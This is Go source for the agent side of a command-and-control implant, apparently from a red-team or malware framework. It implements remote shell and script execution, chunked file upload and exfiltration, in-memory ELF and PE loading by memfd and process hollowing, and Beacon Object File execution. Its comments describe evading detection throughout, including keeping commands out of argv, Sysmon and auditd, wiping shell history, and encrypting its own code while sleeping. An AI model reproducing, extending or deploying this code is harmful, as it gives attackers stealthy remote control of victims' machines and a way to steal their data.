		case "sleep":
			return a.sleepVerb(t)
		case "workhours":
			return a.workhoursVerb(t)
		case "kill", "exit":
			// Self-destruct: exit immediately. The operator will see the
			// beacon go dark on the next expected check-in.
			go func() {
				time.Sleep(time.Second)
				os.Exit(0)
			}()
			return Result{ID: t.ID, Output: encodeOutput([]byte("terminating\n"))}
		}
		return Result{ID: t.ID, Error: fmt.Sprintf("unknown verb: %s", t.Verb)}
	}

	func (a *Agent) execVerb(ctx context.Context, t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID, Error: "exec requires a command"}
		}
		cmd := exec.CommandContext(ctx, t.Args[0], t.Args[1:]...)
		// Neutralise shell history for any shell that gets spawned.
		// No-op for non-shell binaries; correct for exec bash -i.
		cmd.Env = sanitizedEnv()
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		err := cmd.Run()
		r := Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				r.ExitCode = ee.ExitCode()
			} else {
				r.Error = err.Error()
			}
		}
		return r
	}

	// shVerb executes a command via a shell whose argv contains only
	// the shell path. The actual command is written to the shell's
	// stdin and never appears in /proc/<pid>/cmdline, `ps auxww`, or
	// Sysmon EventID 1.
	//
	// Linux/macOS: `/bin/sh -s` reads commands from stdin.
	// Windows:     `cmd.exe /Q` reads commands from stdin.
	//
	// Falls back to exec-style arg passing if the shell cannot be
	// started, so the operator gets a diagnostic rather than silence.
	func (a *Agent) shVerb(ctx context.Context, t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID, Error: "sh requires a command"}
		}

		// Join the args into a single command string. The shell will
		// parse it exactly as if the operator had typed it.
		command := strings.Join(t.Args, " ")

		var shellPath string
		var shellArgv []string
		switch runtime.GOOS {
        case "windows":
            shellPath = "cmd.exe"
            // /Q suppresses command echo. cmd.exe reads from stdin
            // when no /C or /K is supplied, which is what keeps the
            // command out of argv.
            shellArgv = []string{"/Q"}
		default:
			shellPath = "/bin/sh"
			shellArgv = []string{"-s"}
		}

		cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
		// Feed the command via stdin — this is what keeps it out of
		// argv. A trailing newline is required for both sh and cmd.exe
		// to execute the final line.
		cmd.Stdin = strings.NewReader(command + "\n")
		cmd.Env = sanitizedEnv()

		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		err := cmd.Run()
		r := Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				r.ExitCode = ee.ExitCode()
			} else {
				r.Error = err.Error()
			}
		}
		return r
	}

	// pyexecVerb runs a Python script provided inline as base64 in the
	// first task argument. The script is piped to `python3 -` via
	// stdin, so the source never appears in argv, `/proc/<pid>/cmdline`,
	// Sysmon EventID 1, or auditd execve telemetry. Args after a
	// literal `--` in the task are passed to the script as
	// sys.argv[1:].
	//
	// Wire format:
	//   {verb: "pyexec", args: [<b64_src>, "--", <arg1>, <arg2>, ...]}
	//
	// Size: the base64 blob travels in a single JSON task. The console
	// caps local files at 1 MB before encoding. Larger payloads
	// require the shell handler's chunked file transfer, which is not
	// yet wired into the beacon.
	func (a *Agent) pyexecVerb(ctx context.Context, t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID,
				Error: "pyexec requires base64-encoded source as first arg"}
		}

		src, err := base64.StdEncoding.DecodeString(t.Args[0])
		if err != nil {
			return Result{ID: t.ID,
				Error: "invalid base64 in first arg: " + err.Error()}
		}

		scriptArgs := splitScriptArgs(t.Args)

		// Prefer python3, fall back to python. Matches the shell
		// handler's inmemory plugin preference order.
		pythonPath := ""
		for _, candidate := range []string{"python3", "python"} {
			if _, err := exec.LookPath(candidate); err == nil {
				pythonPath = candidate
				break
			}
		}
		if pythonPath == "" {
			return Result{ID: t.ID,
				Error: "python3/python not found on target"}
		}

		// `python3 -` reads the script from stdin, so argv contains only
		// the interpreter name. `ps auxww`, Sysmon EventID 1, and auditd
		// execve see nothing about the script.
		argv := append([]string{"-"}, scriptArgs...)
		cmd := exec.CommandContext(ctx, pythonPath, argv...)
		cmd.Stdin = strings.NewReader(string(src))
		cmd.Env = sanitizedEnv()

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err = cmd.Run()
		r := Result{ID: t.ID}
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				r.ExitCode = ee.ExitCode()
			} else {
				r.Error = err.Error()
				r.Output = encodeOutput(stdout.Bytes())
				return r
			}
		}
		r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
		return r
	}

	// psexecVerb runs a PowerShell script provided inline as base64.
	// The script is piped to `powershell.exe -Command -` via stdin.
	// Windows only.
	//
	// Wire format:
	//   {verb: "psexec", args: [<b64_src>, "--", <arg1>, ...]}
	//
	// PowerShell does not have a clean equivalent to sh's positional
	// args when reading from stdin. Args after `--` are passed but
	// their visibility depends on the host PowerShell version; scripts
	// that need arguments should embed them directly.
	func (a *Agent) psexecVerb(ctx context.Context, t Task) Result {
		if runtime.GOOS != "windows" {
			return Result{ID: t.ID,
				Error: "psexec requires a Windows target"}
		}
		if len(t.Args) == 0 {
			return Result{ID: t.ID,
				Error: "psexec requires base64-encoded source as first arg"}
		}

		src, err := base64.StdEncoding.DecodeString(t.Args[0])
		if err != nil {
			return Result{ID: t.ID,
				Error: "invalid base64 in first arg: " + err.Error()}
		}

		scriptArgs := splitScriptArgs(t.Args)

		// PowerShell reads commands from stdin when the argument after
		// -Command is `-`. The source never appears in argv.
		argv := []string{
			"-NoProfile", "-NoLogo", "-NonInteractive",
			"-ExecutionPolicy", "Bypass",
			"-Command", "-",
		}
		argv = append(argv, scriptArgs...)

		cmd := exec.CommandContext(ctx, "powershell.exe", argv...)
		cmd.Stdin = strings.NewReader(string(src))
		cmd.Env = sanitizedEnv()

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err = cmd.Run()
		r := Result{ID: t.ID}
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				r.ExitCode = ee.ExitCode()
			} else {
				r.Error = err.Error()
				r.Output = encodeOutput(stdout.Bytes())
				return r
			}
		}
		r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
		return r
	}

	// shexecVerb runs a shell script provided inline as base64. Same
	// shape as pyexecVerb, but uses the platform shell.
	//
	// Wire format:
	//   {verb: "shexec", args: [<b64_src>, "--", <arg1>, ...]}
	//
	// On Linux, `sh -s arg1 arg2` runs stdin as a script and sets
	// $1, $2, ... to the trailing args. On Windows, cmd.exe reads the
	// script from stdin via `/Q`.
	func (a *Agent) shexecVerb(ctx context.Context, t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID,
				Error: "shexec requires base64-encoded source as first arg"}
		}

		src, err := base64.StdEncoding.DecodeString(t.Args[0])
		if err != nil {
			return Result{ID: t.ID,
				Error: "invalid base64 in first arg: " + err.Error()}
		}

		scriptArgs := splitScriptArgs(t.Args)

		var shellPath string
		var shellArgv []string
		switch runtime.GOOS {
		case "windows":
			shellPath = "cmd.exe"
			// /Q suppresses echo. cmd.exe reads stdin as a script
			// when no /C or /K is supplied.
			shellArgv = []string{"/Q"}
		default:
			shellPath = "/bin/sh"
			shellArgv = []string{"-s"}
			// Trailing args after -s become $1, $2, ... inside the
			// stdin script.
			shellArgv = append(shellArgv, scriptArgs...)
		}

		cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
		cmd.Stdin = strings.NewReader(string(src))
		cmd.Env = sanitizedEnv()

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err = cmd.Run()
		r := Result{ID: t.ID}
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				r.ExitCode = ee.ExitCode()
			} else {
				r.Error = err.Error()
				r.Output = encodeOutput(stdout.Bytes())
				return r
			}
		}
		r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
		return r
	}

	// splitScriptArgs returns everything after the first literal `--`
	// in args, or nil if no marker is present. Used by the *exec
	// verbs to separate the base64 source (args[0]) from the script's
	// own arguments.
	func splitScriptArgs(args []string) []string {
		for i := 1; i < len(args); i++ {
			if args[i] == "--" {
				return args[i+1:]
			}
		}
		return nil
	}

	// mergeStreams combines stdout and stderr into a single byte
	// slice with a separator when both carry data. If only one is
	// non-empty, it is returned as-is. Used by the *exec verbs so
	// the operator sees both streams in the result without needing
	// additional JSON fields.
	func mergeStreams(stdout, stderr []byte) []byte {
		if len(stderr) == 0 {
			return stdout
		}
		if len(stdout) == 0 {
			return stderr
		}
		out := make([]byte, 0, len(stdout)+len(stderr)+16)
		out = append(out, stdout...)
		if stdout[len(stdout)-1] != '\n' {
			out = append(out, '\n')
		}
		out = append(out, []byte("[stderr]\n")...)
		out = append(out, stderr...)
		return out
	}

	// truncateVerb creates an empty file at the given path, replacing
	// any existing content. Used as the first step of a chunked
	// upload so the target does not have to trust the operator to
	// start from a clean state.
	//
	// Wire format:
	//   {verb: "truncate", args: [<remote_path>]}
	func (a *Agent) truncateVerb(t Task) Result {
		if len(t.Args) < 1 {
			return Result{ID: t.ID, Error: "truncate requires a path"}
		}
		path := t.Args[0]

		// Create or truncate. The write permission is set so that
		// subsequent writechunk calls (which append) succeed even if
		// the process umask is restrictive.
		f, err := os.OpenFile(path,
			os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		f.Close()
		return Result{ID: t.ID,
			Output: encodeOutput([]byte("truncated\n"))}
	}

	// writechunkVerb appends base64-decoded bytes to a file. Chunks
	// arrive sequentially as individual queued tasks, so append mode
	// is safe without coordination.
	//
	// Wire format:
	//   {verb: "writechunk", args: [<b64_data>, <remote_path>]}
	func (a *Agent) writechunkVerb(t Task) Result {
		if len(t.Args) < 2 {
			return Result{ID: t.ID,
				Error: "writechunk requires <b64_data> <remote_path>"}
		}
		data, err := base64.StdEncoding.DecodeString(t.Args[0])
		if err != nil {
			return Result{ID: t.ID,
				Error: "invalid base64: " + err.Error()}
		}
		path := t.Args[1]

		f, err := os.OpenFile(path,
			os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		defer f.Close()

		if _, err := f.Write(data); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: ""}
	}

	// readChunkVerb returns a base64-encoded slice of a remote file.
	// Runs entirely in-process: os.Open, Seek, Read. No subprocess,
	// no argv, no process-creation telemetry. The file is not copied
	// or staged — the bytes travel straight from the file handle into
	// the JSON response body.
	//
	// Wire format:
	//   {verb: "readchunk", args: [<remote_path>, <offset>, <size>]}
	//
	// <offset> and <size> are decimal strings. <size> is capped at
	// 16 MiB so a single chunk cannot exhaust the agent's memory or
	// overflow the result envelope.
	func (a *Agent) readChunkVerb(t Task) Result {
		if len(t.Args) < 3 {
			return Result{ID: t.ID,
				Error: "readchunk requires <path> <offset> <size>"}
		}
		path := t.Args[0]
		offset, err := strconv.ParseInt(t.Args[1], 10, 64)
		if err != nil || offset < 0 {
			return Result{ID: t.ID, Error: "invalid offset"}
		}
		size, err := strconv.ParseInt(t.Args[2], 10, 64)
		if err != nil || size <= 0 || size > 16*1024*1024 {
			return Result{ID: t.ID,
				Error: "invalid size (must be 1..16777216)"}
		}

		f, err := os.Open(path)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		defer f.Close()

		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}

		buf := make([]byte, size)
		n, err := io.ReadFull(f, buf)
		if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
			return Result{ID: t.ID, Error: err.Error()}
		}
		// Zero any bytes past the actual read so a short final chunk
		// cannot leak adjacent heap contents into the response body.
		for i := n; i < len(buf); i++ {
			buf[i] = 0
		}
		return Result{ID: t.ID, Output: encodeOutput(buf[:n])}
	}

	// fileSizeVerb returns the size of a remote file as a decimal
	// string. In-process: os.Stat. No subprocess.
	//
	// Wire format:
	//   {verb: "filesize", args: [<remote_path>]}
	func (a *Agent) fileSizeVerb(t Task) Result {
		if len(t.Args) < 1 {
			return Result{ID: t.ID, Error: "filesize requires a path"}
		}
		info, err := os.Stat(t.Args[0])
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		if info.IsDir() {
			return Result{ID: t.ID, Error: "path is a directory"}
		}
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte(strconv.FormatInt(info.Size(), 10)))}
	}

	// sha256FileVerb returns the hex-encoded SHA-256 of a file, or an
	// error if the file cannot be read.
	//
	// Wire format:
	//   {verb: "sha256file", args: [<remote_path>]}
	func (a *Agent) sha256FileVerb(t Task) Result {
		if len(t.Args) < 1 {
			return Result{ID: t.ID, Error: "sha256file requires a path"}
		}
		f, err := os.Open(t.Args[0])
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		defer f.Close()

		h := sha256.New()
		if _, err := io.Copy(h, f); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		digest := fmt.Sprintf("%x", h.Sum(nil))
		return Result{ID: t.ID, Output: encodeOutput([]byte(digest))}
	}

	// execmemVerb executes a previously-uploaded file in memory.
	//
	// Wire format:
	//   {verb: "execmem", args: [<remote_path>, <kind>, arg1, arg2, ...]}
	//
	// `kind` is "exe" on Windows or "elf" on Linux. Both loaders
	// remove the on-disk file before invocation and execute from
	// memory: ELF via memfd_create, PE via a suspended-host process
	// hollowing.
	func (a *Agent) execmemVerb(ctx context.Context, t Task) Result {
		if len(t.Args) < 2 {
			return Result{ID: t.ID,
				Error: "execmem requires <remote_path> <kind> [args...]"}
		}
		remotePath := t.Args[0]
		kind := strings.ToLower(t.Args[1])
		payloadArgs := t.Args[2:]

		switch kind {
		case "exe":
			out, code, err := execPEInMemory(ctx, remotePath, payloadArgs)
			if err != nil {
				return Result{ID: t.ID, Error: err.Error()}
			}
			r := Result{ID: t.ID, Output: encodeOutput([]byte(out)),
				ExitCode: code}
			return r
		case "elf":
			out, code, err := execELFInMemory(ctx, remotePath, payloadArgs)
			if err != nil {
				return Result{ID: t.ID, Error: err.Error()}
			}
			r := Result{ID: t.ID, Output: encodeOutput([]byte(out)),
				ExitCode: code}
			return r
		default:
			return Result{ID: t.ID,
				Error: fmt.Sprintf("unknown payload kind: %s", kind)}
		}
	}

	// bofVerb executes a Beacon Object File (COFF) in memory via the
	// embedded C# loader. Windows only.
	//
	// Wire format:
	//   {verb: "bof", args: [<b64_coff>, <entry>, <b64_packed_args>]}
	//
	// b64_coff is the raw COFF object, base64-encoded. entry is the
	// entry symbol name (empty string means "use the default: go,
	// then _go"). b64_packed_args is the bof_pack-format argument
	// blob the BOF parses with BeaconDataParse; empty string for no
	// arguments.
	func (a *Agent) bofVerb(ctx context.Context, t Task) Result {
		if len(t.Args) < 1 {
			return Result{ID: t.ID,
				Error: "bof requires base64-encoded COFF as first arg"}
		}
		coffBytes, err := base64.StdEncoding.DecodeString(t.Args[0])
		if err != nil {
			return Result{ID: t.ID,
				Error: "invalid base64 COFF: " + err.Error()}
		}
		entry := ""
		if len(t.Args) > 1 {
			entry = t.Args[1]
		}
		var packedArgs []byte
		if len(t.Args) > 2 && t.Args[2] != "" {
			packedArgs, err = base64.StdEncoding.DecodeString(t.Args[2])
			if err != nil {
				return Result{ID: t.ID,
					Error: "invalid base64 args: " + err.Error()}
			}
		}
		out, code, err := execBOF(ctx, coffBytes, entry, packedArgs)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	}

	func (a *Agent) catVerb(t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID, Error: "cat requires a path"}
		}
		data, err := os.ReadFile(t.Args[0])
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: encodeOutput(data)}
	}

	func (a *Agent) lsVerb(t Task) Result {
		path := "."
		if len(t.Args) > 0 {
			path = t.Args[0]
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		var sb strings.Builder
		for _, e := range entries {
			sb.WriteString(e.Name())
			sb.WriteByte('\n')
		}
		return Result{ID: t.ID, Output: encodeOutput([]byte(sb.String()))}
	}

	// psVerb returns a process list. The actual enumeration is
	// platform-specific (procfs on Linux, Toolhelp on Windows) — see
	// ps_linux.go and ps_windows.go. Both return the same columnar text:
	//
	//     PID      COMMAND
	//     1        systemd
	//     412      sshd
	//
	// No subprocess is spawned on either platform.
	func (a *Agent) psVerb(t Task) Result {
		out, err := nativePS()
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	}

	// idVerb returns uid / gid / username, using stdlib only.
	func (a *Agent) idVerb(t Task) Result {
		out, err := nativeID()
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	}

	func (a *Agent) sleepVerb(t Task) Result {
		if len(t.Args) < 1 {
			return Result{ID: t.ID, Error: "sleep requires seconds"}
		}
		var secs int
		if _, err := fmt.Sscanf(t.Args[0], "%d", &secs); err != nil || secs < 0 {
			return Result{ID: t.ID, Error: "invalid interval (>= 0 required)"}
		}
		a.session.Sleep = secs
		if len(t.Args) > 1 {
			var j float64
			if _, err := fmt.Sscanf(t.Args[1], "%f", &j); err == nil {
				a.session.Jitter = j
			}
		}
		return Result{ID: t.ID,
			Output: encodeOutput([]byte(fmt.Sprintf("sleep=%d jitter=%.2f\n",
				a.session.Sleep, a.session.Jitter)))}
	}

	// workhoursVerb reports or updates the working-hours window.
	//
	//   workhours                 → report current window
	//   workhours <start> <end>   → set window (HH:MM each)
	//   workhours off             → disable the gate
	//
	// The new value takes effect on the next sleep cycle, not the
	// current one — the agent has already entered its sleep before
	// this task can execute. Operators see the same "takes effect on
	// next poll" message from the console as `sleep`.
	func (a *Agent) workhoursVerb(t Task) Result {
		if len(t.Args) == 0 {
			return Result{ID: t.ID, Output: encodeOutput([]byte(
				fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
		}
		if len(t.Args) == 1 {
			arg := strings.ToLower(t.Args[0])
			if arg == "off" || arg == "disable" {
				WorkHoursStart = 0
				WorkHoursEnd = 0
				return Result{ID: t.ID, Output: encodeOutput([]byte(
					"workhours=off\n"))}
			}
			return Result{ID: t.ID,
				Error: "workhours <start> <end> | workhours off"}
		}
		start, ok1 := parseClock(t.Args[0])
		end, ok2 := parseClock(t.Args[1])
		if !ok1 || !ok2 {
			return Result{ID: t.ID,
				Error: "invalid clock format, expected HH:MM"}
		}
		WorkHoursStart = start
		WorkHoursEnd = end
		return Result{ID: t.ID, Output: encodeOutput([]byte(
			fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
	}

	// formatWorkHours renders the current window as "HH:MM-HH:MM"
	// or "off" when disabled. Used by the workhours verb for its
	// response body.
	func formatWorkHours() string {
		if WorkHoursStart == WorkHoursEnd {
			return "off"
		}
		return fmt.Sprintf("%02d:%02d-%02d:%02d",
			WorkHoursStart/60, WorkHoursStart%60,
			WorkHoursEnd/60, WorkHoursEnd%60)
	}

	func (a *Agent) simpleVerb(t Task, payload []byte) Result {
		return Result{ID: t.ID, Output: encodeOutput(payload)}
	}

	func encodeOutput(raw []byte) string {
		return base64.StdEncoding.EncodeToString(raw)
	}

	// sanitizedEnv returns the current process environment with HIST*
	// variables overridden so any shell spawned as a child cannot
	// write command history to disk. This covers the case where an
	// operator runs `exec bash -i` or a shell-starting payload — the
	// child inherits HISTFILE=/dev/null and never touches
	// ~/.bash_history, ~/.zsh_history, or equivalent.
	//
	// Windows shells (cmd.exe, PowerShell) are unaffected by these
	// variables; PowerShell history suppression is handled on the
	// target side via Set-PSReadlineOption when the operator cares.
	func sanitizedEnv() []string {
		base := os.Environ()
		out := make([]string, 0, len(base)+5)
		for _, e := range base {
			if strings.HasPrefix(e, "HISTFILE=") ||
				strings.HasPrefix(e, "HISTSIZE=") ||
				strings.HasPrefix(e, "HISTFILESIZE=") ||
				strings.HasPrefix(e, "HISTCONTROL=") ||
				strings.HasPrefix(e, "HISTIGNORE=") ||
				strings.HasPrefix(e, "HISTTIMEFORMAT=") {
				continue
			}
			out = append(out, e)
		}
		out = append(out,
			"HISTFILE=/dev/null",
			"HISTSIZE=0",
			"HISTFILESIZE=0",
			"HISTCONTROL=ignorespace",
			"HISTIGNORE=*",
			"HISTTIMEFORMAT=",
		)
		return out
	}

	// ---------------------------------------------------------------------------
	// Scheduling

	func (a *Agent) sleep() {
		// The work-hours gate lives in run(), before pollAndRun().
		// This function only handles the normal in-hours sleep
		// interval; it is never reached while outside the window.
		base := a.session.Sleep
		if base < 0 {
			base = 0
		}

		// sleep=0 means "poll continuously". A tiny wall-clock delay
		// prevents pegging the CPU while still letting an operator
		// issue commands interactively through a beacon console.
		if base == 0 {
			time.Sleep(100 * time.Millisecond)
			return
		}


		jitter := a.session.Jitter
		if jitter < 0 {
			jitter = 0
		}
		if jitter > 1 {
			jitter = 1
		}

		a.rngMu.Lock()
		extra := a.rng.Float64() * float64(base) * jitter
		a.rngMu.Unlock()

		total := time.Duration(float64(base)+extra) * time.Second

		// Sleep mask: encrypt the .text section before we go quiet.
		// The key is unique per sleep cycle. If encryption fails, fall
		// through to a normal sleep — the mask is an enhancement, not a
		// requirement.
		var sleepKey []byte
		if SleepMaskEnabled {
			// SleepMaskType is baked in by the builder via
			// -X main.SleepMaskType=… (none, rc4, aes-ctr, ekko).
			// The evasion package picks the matching encryptor.
			if key, err := evasion.EncryptSelf(SleepMaskType); err == nil {
				sleepKey = key
			}
		}

		deadline := time.Now().Add(total)
		for {
			now := time.Now()
			if !now.Before(deadline) {
				break
			}
			if !a.deadline.IsZero() && now.After(a.deadline) {
				break
			}
			step := 30 * time.Second
			if remaining := deadline.Sub(now); remaining < step {
				step = remaining
			}
			time.Sleep(step)
		}

		// Wake: decrypt before any further code runs.
		if sleepKey != nil {
			_ = evasion.DecryptSelf(sleepKey)
		}
	}

	// ---------------------------------------------------------------------------
	// Identity

	func gatherIdentity() Identity {
		hostname, _ := os.Hostname()
		username := ""
		if u, err := user.Current(); err == nil {
			username = u.Username
		}
		return Identity{
			Hostname:  hostname,
			Username:  username,
			MachineID: machineID(),
			OS:        runtime.GOOS,
			Arch:      runtime.GOARCH,
			Proto:     1,
			KillDays:  KillDays,
			WorkStart: WorkHoursStart,
			WorkEnd:   WorkHoursEnd,
		}
	}

	func mustGetwd() string {
		wd, err := os.Getwd()
		if err != nil {
			return "?"
		}
		return wd
	}

	// parseClock parses "HH:MM" into minutes since midnight. Returns
	// (minutes, true) on success and (0, false) on any parse failure.
	// The first return value is only meaningful when the second is
	// true — callers check the boolean before using the value.
	func parseClock(s string) (int, bool) {
		parts := strings.SplitN(strings.TrimSpace(s), ":", 2)
		if len(parts) != 2 {
			return 0, false
		}
		h, err := strconv.Atoi(parts[0])
		if err != nil || h < 0 || h > 23 {
			return 0, false
		}
		m, err := strconv.Atoi(parts[1])
		if err != nil || m < 0 || m > 59 {
			return 0, false
		}
		return h*60 + m, true
	}

	// insideWorkHours reports whether the current local time is
	// inside the operator-configured window. The window is stored as
	// minutes since midnight, updated from build flags at startup
	// and from the X-Beacon-WorkStart / X-Beacon-WorkEnd headers on
	// every /tasks response.
	//
	// Three shapes:
	//
	//   start == end  → disabled, beacon runs 24/7
	//   start <  end  → normal window, e.g. 08:00–19:00
	//   start >  end  → wrapped window, e.g. 22:00–06:00
	//
	// All three are handled without special-casing "off" as a
	// separate boolean: the empty window is a valid degenerate case.
	func insideWorkHours(now time.Time) bool {
		if WorkHoursStart == WorkHoursEnd {
			return true
		}
		cur := now.Hour()*60 + now.Minute()
		if WorkHoursStart < WorkHoursEnd {
			return cur >= WorkHoursStart && cur < WorkHoursEnd
		}
		return cur >= WorkHoursStart || cur < WorkHoursEnd
	}
